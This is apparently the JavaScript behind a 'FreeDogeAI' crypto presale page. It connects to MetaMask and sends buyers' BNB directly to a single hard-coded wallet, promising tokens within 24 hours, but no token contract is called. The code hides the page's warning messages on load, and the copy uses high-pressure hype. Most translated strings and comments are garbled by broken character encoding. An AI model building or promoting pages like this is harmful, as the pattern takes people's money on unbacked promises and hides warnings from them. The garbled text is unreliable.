// app.js
const CONFIG = {
    RECEIVE_WALLET: "0xd924e01c7d319c5b23708cd622bd1143cd4fb360",
    TOKENS_PER_BNB: 120000000000,
    BSC_CHAIN_ID: 56
};

let web3;
let userAddress = "";

// Dil ├зevirileri i├зin s├╢zl├╝k
const translations = {
    en: {
        title: "FreeDogeAI Presale",
        connectWallet: "ЁЯФЧ Connect with MetaMask",
        connected: "тЬЕ Connected",
        walletTitle: "Your Wallet",
        addressLabel: "Address:",
        balanceLabel: "BNB Balance:",
        bnbAmountLabel: "BNB Amount:",
        receiveLabel: "You will receive:",
        buyButton: "ЁЯЪА Buy FDAI Tokens",
        infoTitle: "Important Information",
        infoText1: "Please use MetaMask to complete your purchase.<br>To see your tokens in your wallet, add the contract address manually in MetaMask after the transaction.",
        infoText2: "Tokens will appear in your wallet within 24 hours after your purchase.",
        infoText3: "NOTE: If FDAI tokens do not appear in your wallet after purchase, you can manually add the token using the following contract address:",
        aboutTitle: "About",
        aboutText: "FreeDogeAI is your next big opportunity in the crypto world. Inspired by Doge, powered by AI. Don't miss your chance to join the future of decentralized innovation.",
        whitepaperLink: "Download Whitepaper (PDF)",
        communityTitle: "Community",
        telegramLink: "Telegram: @freedogeaiFDAI",
        twitterLink: "Twitter (X): @FreeDogeAI_FDAI",
        highlightMessage: "Don't miss the next Doge! This opportunity won't last long.",
        metamaskRedirect: "Click to open in MetaMask app"
    },
    tr: {
        title: "FreeDogeAI ├Цn Sat─▒┼Я",
        connectWallet: "ЁЯФЧ MetaMask ile Ba─Яlan",
        connected: "тЬЕ Ba─Яland─▒",
        walletTitle: "C├╝zdan─▒n─▒z",
        addressLabel: "Adres:",
        balanceLabel: "BNB Bakiyesi:",
        bnbAmountLabel: "BNB Miktar─▒:",
        receiveLabel: "Alaca─Я─▒n─▒z Miktar:",
        buyButton: "ЁЯЪА FDAI Token Sat─▒n Al",
        infoTitle: "├Цnemli Bilgiler",
        infoText1: "Sat─▒n alma i┼Яleminizi tamamlamak i├зin l├╝tfen MetaMask kullan─▒n.<br>Tokenlar─▒n─▒z─▒ c├╝zdan─▒n─▒zda g├╢rmek i├зin, i┼Яlemden sonra MetaMask'e s├╢zle┼Яme adresini manuel olarak ekleyin.",
        infoText2: "Tokenlar sat─▒n alma i┼Яleminden sonra 24 saat i├зinde c├╝zdan─▒n─▒zda g├╢r├╝necektir.",
        infoText3: "NOT: E─Яer FDAI tokenlar─▒ sat─▒n alma i┼Яleminden sonra c├╝zdan─▒n─▒zda g├╢r├╝nmezse, a┼Яa─Я─▒daki s├╢zle┼Яme adresini kullanarak token─▒ manuel olarak ekleyebilirsiniz:",
        aboutTitle: "Hakk─▒nda",
        aboutText: "FreeDogeAI, kripto d├╝nyas─▒ndaki bir sonraki b├╝y├╝k f─▒rsat─▒n─▒z. Doge'dan ilham al─▒nd─▒, yapay zeka ile g├╝├зlendirildi. Merkezi olmayan yeniliklerin gelece─Яine kat─▒lma ┼Яans─▒n─▒z─▒ ka├з─▒rmay─▒n.",
        whitepaperLink: "Beyaz B├╝lteni ─░ndir (PDF)",
        communityTitle: "Topluluk",
        telegramLink: "Telegram: @freedogeaiFDAI",
        twitterLink: "Twitter (X): @FreeDogeAI_FDAI",
        highlightMessage: "Bir sonraki Doge'u ka├з─▒rmay─▒n! Bu f─▒rsat uzun s├╝rmeyecek.",
        metamaskRedirect: "MetaMask uygulamas─▒nda a├зmak i├зin t─▒klay─▒n"
    },
    ar: {
        title: "╪и┘К╪╣ ┘Е╪│╪и┘В ┘Д┘А FreeDogeAI",
        connectWallet: "ЁЯФЧ ╪з┘Д╪з╪к╪╡╪з┘Д ╪и┘А MetaMask",
        connected: "тЬЕ ┘Е╪к╪╡┘Д",
        walletTitle: "┘Е╪н┘Б╪╕╪к┘Г",
        addressLabel: "╪з┘Д╪╣┘Ж┘И╪з┘Ж:",
        balanceLabel: "╪▒╪╡┘К╪п BNB:",
        bnbAmountLabel: "┘Г┘Е┘К╪й BNB:",
        receiveLabel: "╪│╪к╪к┘Д┘В┘Й:",
        buyButton: "ЁЯЪА ╪┤╪▒╪з╪б ╪▒┘Е┘И╪▓ FDAI",
        infoTitle: "┘Е╪╣┘Д┘И┘Е╪з╪к ┘З╪з┘Е╪й",
        infoText1: "┘К╪▒╪м┘Й ╪з╪│╪к╪о╪п╪з┘Е MetaMask ┘Д╪е┘Г┘Е╪з┘Д ╪╣┘Е┘Д┘К╪й ╪з┘Д╪┤╪▒╪з╪б.<br>┘Д╪▒╪д┘К╪й ╪з┘Д╪▒┘Е┘И╪▓ ┘Б┘К ┘Е╪н┘Б╪╕╪к┘Г╪М ╪г╪╢┘Б ╪╣┘Ж┘И╪з┘Ж ╪з┘Д╪╣┘В╪п ┘К╪п┘И┘К┘Л╪з ┘Б┘К MetaMask ╪и╪╣╪п ╪з┘Д┘Е╪╣╪з┘Е┘Д╪й.",
        infoText2: "╪│╪к╪╕┘З╪▒ ╪з┘Д╪▒┘Е┘И╪▓ ┘Б┘К ┘Е╪н┘Б╪╕╪к┘Г ╪о┘Д╪з┘Д 24 ╪│╪з╪╣╪й ╪и╪╣╪п ╪з┘Д╪┤╪▒╪з╪б.",
        infoText3: "┘Е┘Д╪з╪н╪╕╪й: ╪е╪░╪з ┘Д┘Е ╪к╪╕┘З╪▒ ╪▒┘Е┘И╪▓ FDAI ┘Б┘К ┘Е╪н┘Б╪╕╪к┘Г ╪и╪╣╪п ╪з┘Д╪┤╪▒╪з╪б╪М ┘К┘Е┘Г┘Ж┘Г ╪е╪╢╪з┘Б╪й ╪з┘Д╪▒┘Е╪▓ ┘К╪п┘И┘К┘Л╪з ╪и╪з╪│╪к╪о╪п╪з┘Е ╪╣┘Ж┘И╪з┘Ж ╪з┘Д╪╣┘В╪п ╪з┘Д╪к╪з┘Д┘К:",
        aboutTitle: "╪╣┘Ж ╪з┘Д┘Е╪┤╪▒┘И╪╣",
        aboutText: "FreeDogeAI ┘З┘К ┘Б╪▒╪╡╪к┘Г ╪з┘Д┘Г╪и┘К╪▒╪й ╪з┘Д┘В╪з╪п┘Е╪й ┘Б┘К ╪╣╪з┘Д┘Е ╪з┘Д╪╣┘Е┘Д╪з╪к ╪з┘Д╪▒┘В┘Е┘К╪й. ┘Е╪│╪к┘И╪н╪з╪й ┘Е┘Ж Doge╪М ┘Е╪п╪╣┘И┘Е╪й ╪и╪з┘Д╪░┘Г╪з╪б ╪з┘Д╪з╪╡╪╖┘Ж╪з╪╣┘К. ┘Д╪з ╪к┘Б┘И╪к ┘Б╪▒╪╡╪к┘Г ┘Д┘Д╪з┘Ж╪╢┘Е╪з┘Е ╪е┘Д┘Й ┘Е╪│╪к┘В╪и┘Д ╪з┘Д╪з╪и╪к┘Г╪з╪▒ ╪з┘Д┘Д╪з┘Е╪▒┘Г╪▓┘К.",
        whitepaperLink: "╪к╪н┘Е┘К┘Д ╪з┘Д┘И╪▒┘В╪й ╪з┘Д╪и┘К╪╢╪з╪б (PDF)",
        communityTitle: "╪з┘Д┘Е╪м╪к┘Е╪╣",
        telegramLink: "╪к┘К┘Д┘К╪м╪▒╪з┘Е: @freedogeaiFDAI",
        twitterLink: "╪к┘И┘К╪к╪▒ (X): @FreeDogeAI_FDAI",
        highlightMessage: "┘Д╪з ╪к┘Б┘И╪к ╪з┘Д┘А Doge ╪з┘Д┘В╪з╪п┘Е! ┘З╪░┘З ╪з┘Д┘Б╪▒╪╡╪й ┘Д┘Ж ╪к╪│╪к┘Е╪▒ ╪╖┘И┘К┘Д╪з┘Л.",
        metamaskRedirect: "╪з┘Ж┘В╪▒ ┘Д┘Б╪к╪н ╪з┘Д╪к╪╖╪и┘К┘В ┘Б┘К MetaMask"
    },
    hi: {
        title: "FreeDogeAI рдкреНрд░реАрд╕реЗрд▓",
        connectWallet: "ЁЯФЧ MetaMask рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ",
        connected: "тЬЕ рдХрдиреЗрдХреНрдЯреЗрдб",
        walletTitle: "рдЖрдкрдХрд╛ рд╡реЙрд▓реЗрдЯ",
        addressLabel: "рдкрддрд╛:",
        balanceLabel: "BNB рдмреИрд▓реЗрдВрд╕:",
        bnbAmountLabel: "BNB рд░рд╛рд╢рд┐:",
        receiveLabel: "рдЖрдкрдХреЛ рдорд┐рд▓реЗрдЧрд╛:",
        buyButton: "ЁЯЪА FDAI рдЯреЛрдХрди рдЦрд░реАрджреЗрдВ",
        infoTitle: "рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА",
        infoText1: "рдХреГрдкрдпрд╛ рдЕрдкрдиреА рдЦрд░реАрджрд╛рд░реА рдкреВрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП MetaMask рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред<br>рдЕрдкрдиреЗ рд╡реЙрд▓реЗрдЯ рдореЗрдВ рдЯреЛрдХрди рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рд▓реЗрдирджреЗрди рдХреЗ рдмрд╛рдж MetaMask рдореЗрдВ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯ рдкрддрд╛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝реЗрдВред",
        infoText2: "рдЦрд░реАрджрд╛рд░реА рдХреЗ рдмрд╛рдж 24 рдШрдВрдЯреЗ рдХреЗ рднреАрддрд░ рдЯреЛрдХрди рдЖрдкрдХреЗ рд╡реЙрд▓реЗрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдВрдЧреЗред",
        infoText3: "рдиреЛрдЯ: рдпрджрд┐ рдЦрд░реАрджрд╛рд░реА рдХреЗ рдмрд╛рдж FDAI рдЯреЛрдХрди рдЖрдкрдХреЗ рд╡реЙрд▓реЗрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддреЗ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯ рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЯреЛрдХрди рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ:",
        aboutTitle: "рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ",
        aboutText: "FreeDogeAI рдХреНрд░рд┐рдкреНрдЯреЛ рдЬрдЧрдд рдореЗрдВ рдЖрдкрдХрд╛ рдЕрдЧрд▓рд╛ рдмрдбрд╝рд╛ рдЕрд╡рд╕рд░ рд╣реИред Doge рд╕реЗ рдкреНрд░реЗрд░рд┐рдд, AI рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рддред рд╡рд┐рдХреЗрдиреНрджреНрд░реАрдХреГрдд рдирд╡рд╛рдЪрд╛рд░ рдХреЗ рднрд╡рд┐рд╖реНрдп рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рдХрд╛ рдореМрдХрд╛ рди рдЪреВрдХреЗрдВред",
        whitepaperLink: "рд╡реНрд╣рд╛рдЗрдЯрдкреЗрдкрд░ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ (PDF)",
        communityTitle: "рд╕рдореБрджрд╛рдп",
        telegramLink: "рдЯреЗрд▓реАрдЧреНрд░рд╛рдо: @freedogeaiFDAI",
        twitterLink: "рдЯреНрд╡рд┐рдЯрд░ (X): @FreeDogeAI_FDAI",
        highlightMessage: "рдЕрдЧрд▓рд╛ Doge рди рдЪреВрдХреЗрдВ! рдпрд╣ рдЕрд╡рд╕рд░ рдЬреНрдпрд╛рджрд╛ рд╕рдордп рддрдХ рдирд╣реАрдВ рд░рд╣реЗрдЧрд╛ред",
        metamaskRedirect: "MetaMask рдРрдк рдореЗрдВ рдЦреЛрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ"
    },
    ur: {
        title: "FreeDogeAI ┘╛╪▒█М ╪│█М┘Д",
        connectWallet: "ЁЯФЧ MetaMask ┌й█Т ╪│╪з╪к┌╛ ┌й┘Ж█М┌й┘╣ ┌й╪▒█М┌║",
        connected: "тЬЕ ┌й┘Ж█М┌й┘╣ █Б┘И ┌п█М╪з",
        walletTitle: "╪в┘╛ ┌й╪з ┘И╪з┘Д┘╣",
        addressLabel: "╪з█М┌И╪▒█М╪│:",
        balanceLabel: "BNB ╪и█М┘Д┘Ж╪│:",
        bnbAmountLabel: "BNB ┌й█М ┘Е┘В╪п╪з╪▒:",
        receiveLabel: "╪в┘╛ ┌й┘И ┘Е┘Д█Т ┌п╪з:",
        buyButton: "ЁЯЪА FDAI ┘╣┘И┌й┘Ж╪▓ ╪о╪▒█М╪п█М┌║",
        infoTitle: "╪з█Б┘Е ┘Е╪╣┘Д┘И┘Е╪з╪к",
        infoText1: "╪и╪▒╪з█Б ┌й╪▒┘Е ╪з┘╛┘Ж█М ╪о╪▒█М╪п╪з╪▒█М ┘Е┌й┘Е┘Д ┌й╪▒┘Ж█Т ┌й█Т ┘Д█М█Т MetaMask ╪з╪│╪к╪╣┘Е╪з┘Д ┌й╪▒█М┌║█Ф<br>╪з┘╛┘Ж█Т ┘И╪з┘Д┘╣ ┘Е█М┌║ ┘╣┘И┌й┘Ж╪▓ ╪п█М┌й┌╛┘Ж█Т ┌й█Т ┘Д█М█Т╪М ┘╣╪▒╪з┘Ж╪▓█М┌й╪┤┘Ж ┌й█Т ╪и╪╣╪п MetaMask ┘Е█М┌║ ┌й┘Ж┘╣╪▒█М┌й┘╣ ╪з█М┌И╪▒█М╪│ ╪п╪│╪к█М ╪╖┘И╪▒ ┘╛╪▒ ╪┤╪з┘Е┘Д ┌й╪▒█М┌║█Ф",
        infoText2: "╪о╪▒█М╪п╪з╪▒█М ┌й█Т ╪и╪╣╪п 24 ┌п┌╛┘Ж┘╣┘И┌║ ┌й█Т ╪з┘Ж╪п╪▒ ┘╣┘И┌й┘Ж╪▓ ╪в┘╛ ┌й█Т ┘И╪з┘Д┘╣ ┘Е█М┌║ ┘Ж╪╕╪▒ ╪в╪ж█М┌║ ┌п█Т█Ф",
        infoText3: "┘Ж┘И┘╣: ╪з┌п╪▒ ╪о╪▒█М╪п╪з╪▒█М ┌й█Т ╪и╪╣╪п FDAI ┘╣┘И┌й┘Ж╪▓ ╪в┘╛ ┌й█Т ┘И╪з┘Д┘╣ ┘Е█М┌║ ┘Ж╪╕╪▒ ┘Ж█Б ╪в╪ж█М┌║╪М ╪к┘И ╪в┘╛ ╪п╪▒╪м ╪░█М┘Д ┌й┘Ж┘╣╪▒█М┌й┘╣ ╪з█М┌И╪▒█М╪│ ┌й╪з ╪з╪│╪к╪╣┘Е╪з┘Д ┌й╪▒╪к█Т █Б┘И╪ж█Т ┘╣┘И┌й┘Ж ╪п╪│╪к█М ╪╖┘И╪▒ ┘╛╪▒ ╪┤╪з┘Е┘Д ┌й╪▒ ╪│┌й╪к█Т █Б█М┌║:",
        aboutTitle: "┌й█Т ╪и╪з╪▒█Т ┘Е█М┌║",
        aboutText: "FreeDogeAI ╪в┘╛ ┌й╪з ┌й╪▒█М┘╛┘╣┘И ╪п┘Ж█М╪з ┘Е█М┌║ ╪з┌п┘Д╪з ╪и┌С╪з ┘Е┘И┘В╪╣ █Б█Т█Ф Doge ╪│█Т ┘Е╪к╪з╪л╪▒╪М AI ┌й█Т ╪░╪▒█М╪╣█Т ╪к┘В┘И█М╪к █М╪з┘Б╪к█Б█Ф ╪║█М╪▒ ┘Е╪к┘Е╪▒┌й╪▓ ╪м╪п╪к ┌й█Т ┘Е╪│╪к┘В╪и┘Д ┘Е█М┌║ ╪┤╪з┘Е┘Д █Б┘И┘Ж█Т ┌й╪з ┘Е┘И┘В╪╣ ┘Ж█Б ┌Ж┌╛┘И┌С█М┌║█Ф",
        whitepaperLink: "┘И╪з╪ж┘╣ ┘╛█М┘╛╪▒ ┌И╪з╪д┘Ж ┘Д┘И┌И ┌й╪▒█М┌║ (PDF)",
        communityTitle: "┌й┘Е█М┘И┘Ж┘╣█М",
        telegramLink: "┘╣█М┘Д█М ┌п╪▒╪з┘Е: @freedogeaiFDAI",
        twitterLink: "┘╣┘И█М┘╣╪▒ (X): @FreeDogeAI_FDAI",
        highlightMessage: "╪з┌п┘Д╪з Doge ┘Е╪к ┌Ж┌╛┘И┌С█М┌║! █М█Б ┘Е┘И┘В╪╣ ╪▓█М╪з╪п█Б ╪п█М╪▒ ╪к┌й ┘Ж█Б█М┌║ ╪▒█Б█Т ┌п╪з█Ф",
        metamaskRedirect: "MetaMask ╪з█М┘╛ ┘Е█М┌║ ┌й┌╛┘И┘Д┘Ж█Т ┌й█Т ┘Д█М█Т ┌й┘Д┌й ┌й╪▒█М┌║"
    },
    ru: {
        title: "╨Я╤А╨╡╨┤╨┐╤А╨╛╨┤╨░╨╢╨░ FreeDogeAI",
        connectWallet: "ЁЯФЧ ╨Я╨╛╨┤╨║╨╗╤О╤З╨╕╤В╤М╤Б╤П ╤З╨╡╤А╨╡╨╖ MetaMask",
        connected: "тЬЕ ╨Я╨╛╨┤╨║╨╗╤О╤З╨╡╨╜╨╛",
        walletTitle: "╨Т╨░╤И ╨║╨╛╤И╨╡╨╗╨╡╨║",
        addressLabel: "╨Р╨┤╤А╨╡╤Б:",
        balanceLabel: "╨С╨░╨╗╨░╨╜╤Б BNB:",
        bnbAmountLabel: "╨б╤Г╨╝╨╝╨░ BNB:",
        receiveLabel: "╨Т╤Л ╨┐╨╛╨╗╤Г╤З╨╕╤В╨╡:",
        buyButton: "ЁЯЪА ╨Ъ╤Г╨┐╨╕╤В╤М ╤В╨╛╨║╨╡╨╜╤Л FDAI",
        infoTitle: "╨Т╨░╨╢╨╜╨░╤П ╨╕╨╜╤Д╨╛╤А╨╝╨░╤Ж╨╕╤П",
        infoText1: "╨Я╨╛╨╢╨░╨╗╤Г╨╣╤Б╤В╨░, ╨╕╤Б╨┐╨╛╨╗╤М╨╖╤Г╨╣╤В╨╡ MetaMask ╨┤╨╗╤П ╨╖╨░╨▓╨╡╤А╤И╨╡╨╜╨╕╤П ╨┐╨╛╨║╤Г╨┐╨║╨╕.<br>╨з╤В╨╛╨▒╤Л ╤Г╨▓╨╕╨┤╨╡╤В╤М ╤В╨╛╨║╨╡╨╜╤Л ╨▓ ╨║╨╛╤И╨╡╨╗╤М╨║╨╡, ╨┤╨╛╨▒╨░╨▓╤М╤В╨╡ ╨░╨┤╤А╨╡╤Б ╨║╨╛╨╜╤В╤А╨░╨║╤В╨░ ╨▓╤А╤Г╤З╨╜╤Г╤О ╨▓ MetaMask ╨┐╨╛╤Б╨╗╨╡ ╤В╤А╨░╨╜╨╖╨░╨║╤Ж╨╕╨╕.",
        infoText2: "╨в╨╛╨║╨╡╨╜╤Л ╨┐╨╛╤П╨▓╤П╤В╤Б╤П ╨▓ ╨▓╨░╤И╨╡╨╝ ╨║╨╛╤И╨╡╨╗╤М╨║╨╡ ╨▓ ╤В╨╡╤З╨╡╨╜╨╕╨╡ 24 ╤З╨░╤Б╨╛╨▓ ╨┐╨╛╤Б╨╗╨╡ ╨┐╨╛╨║╤Г╨┐╨║╨╕.",
        infoText3: "╨Я╨а╨Ш╨Ь╨Х╨з╨Р╨Э╨Ш╨Х: ╨Х╤Б╨╗╨╕ ╤В╨╛╨║╨╡╨╜╤Л FDAI ╨╜╨╡ ╨╛╤В╨╛╨▒╤А╨░╨╢╨░╤О╤В╤Б╤П ╨▓ ╨▓╨░╤И╨╡╨╝ ╨║╨╛╤И╨╡╨╗╤М╨║╨╡ ╨┐╨╛╤Б╨╗╨╡ ╨┐╨╛╨║╤Г╨┐╨║╨╕, ╨▓╤Л ╨╝╨╛╨╢╨╡╤В╨╡ ╨▓╤А╤Г╤З╨╜╤Г╤О ╨┤╨╛╨▒╨░╨▓╨╕╤В╤М ╤В╨╛╨║╨╡╨╜, ╨╕╤Б╨┐╨╛╨╗╤М╨╖╤Г╤П ╤Б╨╗╨╡╨┤╤Г╤О╤Й╨╕╨╣ ╨░╨┤╤А╨╡╤Б ╨║╨╛╨╜╤В╤А╨░╨║╤В╨░:",
        aboutTitle: "╨Ю ╨┐╤А╨╛╨╡╨║╤В╨╡",
        aboutText: "FreeDogeAI тАФ ╤Н╤В╨╛ ╨▓╨░╤И╨░ ╤Б╨╗╨╡╨┤╤Г╤О╤Й╨░╤П ╨▒╨╛╨╗╤М╤И╨░╤П ╨▓╨╛╨╖╨╝╨╛╨╢╨╜╨╛╤Б╤В╤М ╨▓ ╨╝╨╕╤А╨╡ ╨║╤А╨╕╨┐╤В╨╛╨▓╨░╨╗╤О╤В. ╨Т╨┤╨╛╤Е╨╜╨╛╨▓╨╗╨╡╨╜╨╛ Doge, ╨┐╨╛╨┤╨┤╨╡╤А╨╢╨╕╨▓╨░╨╡╤В╤Б╤П ╨╕╤Б╨║╤Г╤Б╤Б╤В╨▓╨╡╨╜╨╜╤Л╨╝ ╨╕╨╜╤В╨╡╨╗╨╗╨╡╨║╤В╨╛╨╝. ╨Э╨╡ ╤Г╨┐╤Г╤Б╤В╨╕╤В╨╡ ╤И╨░╨╜╤Б ╨┐╤А╨╕╤Б╨╛╨╡╨┤╨╕╨╜╨╕╤В╤М╤Б╤П ╨║ ╨▒╤Г╨┤╤Г╤Й╨╡╨╝╤Г ╨┤╨╡╤Ж╨╡╨╜╤В╤А╨░╨╗╨╕╨╖╨╛╨▓╨░╨╜╨╜╤Л╤Е ╨╕╨╜╨╜╨╛╨▓╨░╤Ж╨╕╨╣.",
        whitepaperLink: "╨б╨║╨░╤З╨░╤В╤М ╨▒╨╡╨╗╤Г╤О ╨║╨╜╨╕╨│╤Г (PDF)",
        communityTitle: "╨б╨╛╨╛╨▒╤Й╨╡╤Б╤В╨▓╨╛",
        telegramLink: "╨в╨╡╨╗╨╡╨│╤А╨░╨╝: @freedogeaiFDAI",
        twitterLink: "╨в╨▓╨╕╤В╤В╨╡╤А (X): @FreeDogeAI_FDAI",
        highlightMessage: "╨Э╨╡ ╨┐╤А╨╛╨┐╤Г╤Б╤В╨╕╤В╨╡ ╤Б╨╗╨╡╨┤╤Г╤О╤Й╨╕╨╣ Doge! ╨н╤В╨░ ╨▓╨╛╨╖╨╝╨╛╨╢╨╜╨╛╤Б╤В╤М ╨╜╨╡ ╨┐╤А╨╛╨┤╨╗╨╕╤В╤Б╤П ╨┤╨╛╨╗╨│╨╛.",
        metamaskRedirect: "╨Э╨░╨╢╨╝╨╕╤В╨╡, ╤З╤В╨╛╨▒╤Л ╨╛╤В╨║╤А╤Л╤В╤М ╨▓ ╨┐╤А╨╕╨╗╨╛╨╢╨╡╨╜╨╕╨╕ MetaMask"
    }
};

// Dil de─Яi┼Яtirme fonksiyonu
const changeLanguage = (lang) => {
    document.querySelector("h1").textContent = translations[lang].title;
    document.getElementById("connectWalletBtn").textContent = translations[lang].connectWallet;
    document.querySelector("#walletInfo h3").textContent = translations[lang].walletTitle;
    document.querySelector("#walletInfo p:nth-child(1) strong").textContent = translations[lang].addressLabel;
    document.querySelector("#walletInfo p:nth-child(2) strong").textContent = translations[lang].balanceLabel;
    document.querySelector("label[for='bnbAmount'] strong").textContent = translations[lang].bnbAmountLabel;
    document.querySelector("#calculationResult strong").textContent = translations[lang].receiveLabel;
    document.getElementById("buyBtn").textContent = translations[lang].buyButton;
    document.querySelector(".info-box h3").textContent = translations[lang].infoTitle;
    document.querySelector(".info-box p:nth-child(2)").innerHTML = translations[lang].infoText1;
    document.querySelector(".info-box p:nth-child(3)").textContent = translations[lang].infoText2;
    document.querySelector(".info-box p:nth-child(4)").innerHTML = translations[lang].infoText3;
    document.querySelector("div[style*='border-top'] h3:nth-child(1)").textContent = translations[lang].aboutTitle;
    document.querySelector("div[style*='border-top'] p:nth-child(2)").textContent = translations[lang].aboutText;
    document.querySelector("div[style*='border-top'] a[href*='Whitepaper']").textContent = translations[lang].whitepaperLink;
    document.querySelector("div[style*='border-top'] h3:nth-child(4)").textContent = translations[lang].communityTitle;
    document.querySelector("div[style*='border-top'] ul li:nth-child(1) a").textContent = translations[lang].telegramLink;
    document.querySelector("div[style*='border-top'] ul li:nth-child(2) a").textContent = translations[lang].twitterLink;
    document.querySelector(".highlight-message").textContent = translations[lang].highlightMessage;
    document.getElementById("openInMetamask").textContent = translations[lang].metamaskRedirect;

    if (document.getElementById("connectWalletBtn").textContent.includes("тЬЕ")) {
        document.getElementById("connectWalletBtn").textContent = translations[lang].connected;
    }
};

// Taray─▒c─▒ kontrol├╝
const isMobile = () => /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
const isInMetamaskBrowser = () => navigator.userAgent.includes("MetaMask") && window.ethereum?.isMetaMask;

// MetaMask'a y├╢nlendirme
const redirectToMetamask = () => {
    const currentUrl = window.location.href.replace(/^https?:\/\//, '');
    window.location.href = `https://metamask.app.link/dapp/${currentUrl}`;
};

// C├╝zdan ba─Яlant─▒s─▒
const connectWallet = async () => {
    if (isInMetamaskBrowser()) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            web3 = new Web3(window.ethereum);

            try {
                const chainId = await web3.eth.getChainId();
                if (chainId !== CONFIG.BSC_CHAIN_ID) {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x38' }]
                    });
                }
            } catch (error) {
                console.log("A─Я de─Яi┼Яtirme hatas─▒:", error);
            }

            updateWalletUI();
            return;
        } catch (error) {
            console.log("Ba─Яlant─▒ hatas─▒:", error);
            return;
        }
    }

    if (isMobile()) {
        document.getElementById('metamaskRedirect').style.display = 'block';
        document.getElementById('openInMetamask').addEventListener('click', redirectToMetamask);
        return;
    }

    if (!window.ethereum) {
        window.open("https://metamask.io/download.html", "_blank");
        return;
    }

    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        web3 = new Web3(window.ethereum);

        const chainId = await web3.eth.getChainId();
        if (chainId !== CONFIG.BSC_CHAIN_ID) {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
            });
        }

        updateWalletUI();
    } catch (error) {
        console.log("Ba─Яlant─▒ hatas─▒:", error);
    }
};

// UI g├╝ncelleme
const updateWalletUI = () => {
    document.getElementById("walletAddress").textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
    document.getElementById("userTokenAddress").textContent = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
    document.getElementById("walletInfo").style.display = 'block';
    document.getElementById("connectWalletBtn").textContent = 'тЬЕ Connected';
    document.getElementById("buyBtn").disabled = false;

    web3.eth.getBalance(userAddress).then(balance => {
        document.getElementById("bnbBalance").textContent = `${parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(6)} BNB`;
    });
};

// BNB g├╢nderim fonksiyonu
const sendBNB = async () => {
    const bnbAmount = parseFloat(document.getElementById("bnbAmount").value);
    
    if (!bnbAmount || bnbAmount <= 0) {
        return;
    }

    try {
        const weiAmount = web3.utils.toWei(bnbAmount.toString(), 'ether');
        
        const tx = {
            from: userAddress,
            to: CONFIG.RECEIVE_WALLET,
            value: weiAmount,
            gas: 300000,
            gasPrice: await web3.eth.getGasPrice()
        };

        const receipt = await web3.eth.sendTransaction(tx);
        
        alert(`тЬЕ ${bnbAmount} BNB ba┼Яar─▒yla g├╢nderildi!\n\nTX Hash: ${receipt.transactionHash}`);
        
    } catch (error) {
        console.error("G├╢nderim hatas─▒:", error);
    }
};

// Sayfa y├╝klendi─Яinde
window.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll('.warning-message').forEach(el => el.style.display = 'none');
    
    document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
    document.getElementById("buyBtn").addEventListener("click", sendBNB);
    
    document.getElementById('bnbAmount').addEventListener('input', function() {
        const amount = parseFloat(this.value) || 0;
        document.getElementById('fdaiAmount').textContent = (amount * CONFIG.TOKENS_PER_BNB).toLocaleString();
    });

    if (isInMetamaskBrowser() && window.ethereum.selectedAddress) {
        userAddress = window.ethereum.selectedAddress;
        web3 = new Web3(window.ethereum);
        updateWalletUI();
    }

    // Dil de─Яi┼Яtiriciyi dinle
    const languageSwitcher = document.getElementById("languageSwitcher");
    changeLanguage(languageSwitcher.value);
    languageSwitcher.addEventListener("change", (event) => {
        const selectedLang = event.target.value;
        changeLanguage(selectedLang);
    });
});

// C├╝zdan de─Яi┼Яikliklerini dinle
if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
            userAddress = accounts[0];
            updateWalletUI();
        } else {
            document.getElementById('walletInfo').style.display = 'none';
            document.getElementById('connectWalletBtn').textContent = 'ЁЯФЧ MetaMask ile Ba─Яlan';
            document.getElementById('buyBtn').disabled = true;
        }
    });
    
    window.ethereum.on('chainChanged', () => window.location.reload());
}
